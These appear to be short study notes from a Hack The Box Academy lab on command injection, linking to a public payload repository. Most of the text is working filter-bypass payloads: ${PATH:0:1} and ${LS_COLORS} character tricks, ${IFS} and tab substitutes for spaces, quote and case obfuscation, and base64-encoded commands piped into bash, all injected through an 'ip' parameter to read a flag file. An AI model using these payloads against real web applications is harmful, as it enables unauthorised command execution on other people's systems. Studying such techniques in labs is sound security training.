https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space
```
${PATH:0:1} = / for filter bypass
```
```
theo854@htb[/htb]$ echo ${LS_COLORS:10:1}     = ; bypass
```
`${IFS}`  space

ip=127.0.0.1%0a{ls,${PATH:0:1}home}
```
ip=127.0.0.1%0a{c'a't,${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}
```

```
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") all lowercase
```

```
echo 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64
ip=127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```

Automated tools: 
https://academy.hackthebox.com/app/module/109/section/1040
\x20 bypass linux bash space